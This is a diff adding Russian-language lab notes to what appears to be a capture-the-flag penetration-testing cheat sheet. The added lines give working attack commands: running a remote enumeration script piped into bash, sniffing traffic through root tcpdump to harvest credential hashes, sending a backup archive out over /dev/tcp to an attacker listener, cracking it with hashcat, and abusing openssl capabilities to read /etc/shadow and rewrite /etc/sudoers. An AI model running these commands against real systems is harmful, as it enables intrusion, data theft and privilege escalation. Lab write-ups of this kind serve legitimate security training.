@@ -47,6 +47,59 @@ find . -type f
 на целевой машине делаем 
 curl 10.10.14.3/LinEnum.sh | bash
 
+есть возможность от рута запустить tcpdump
+
+https://gtfobins.github.io/  - https://gtfobins.github.io/gtfobins/tcpdump/ получаем шел
+******************************************************************************************
+Проверяем 
+ssh 10.10.10.4@10.10.10.119 "/usr/sbin/tcpdump -i ens33 -U -s0 -W - 'not port 22'" >> network.ens33.cap
+pasword:10.10.10.4
+
+паралельно запускаем wiershark и скармлеваем файл
+wieshark network.ens33.cap  - в реальном режиме должен показать трафик
+
+ssh 10.10.10.4@10.10.10.119 "/usr/sbin/tcpdump -i ens33 -U -s0 -W - 'not port 22'" | wireshark -k -i -
+
+для того чтобы увидить трафик нужно запустьть или пинг или на веббраузере перезапустить странички
+При анализе получим пароль в кредах правда хеш
+*******************************************************************************************
+
+для того чтобы передать файл любой можна использовать команду 
+с целевого сервера 
+cat backup.7z > /dev/tcp/10.10.14.3/9001  - посилаем на этот порт нажать ентер после запуска на нашей тачки ncat
+
+на своей тачки мы запускаем
+ncat -lvnp 9001 > backup.7z
+
+**************
+7z x backup.7z
+
+но он запароленый
+пробуем zip2john backup.7z
+ищим locale 7z2john - для нормальной работы необходим дополнительный пакет apt-install libcompress-raw-lzma-perl
+
+7z2john backup.7z - получаем хеш копируем и идем в hashcat!
+
+
+./hashcat -m 11600 hashcat/lin.7z /opt/wordlist/rockyou.txt получаем пароль delete от архива
+
+*******************************************
+Найдя пароль от ldapsuser1 
+зайдя под эти пользователем мы вводим команду 
+getcap *
+
+https://gtfobins.github.io/gtfobins/openssl/
+
+смотрим привилегии 
+./openssl enc -in /etc/shadow
+можем внести правки в файл
+./openssl enc -in /etc/sudoers
+копируем и правим так как нам нужно
+./openssl enc -in /etc/sudoers > sudoers
+
+записываем обратно
+cat ./sudoers | ./openssl enc -out /etc/sudoers
+
 
 
 
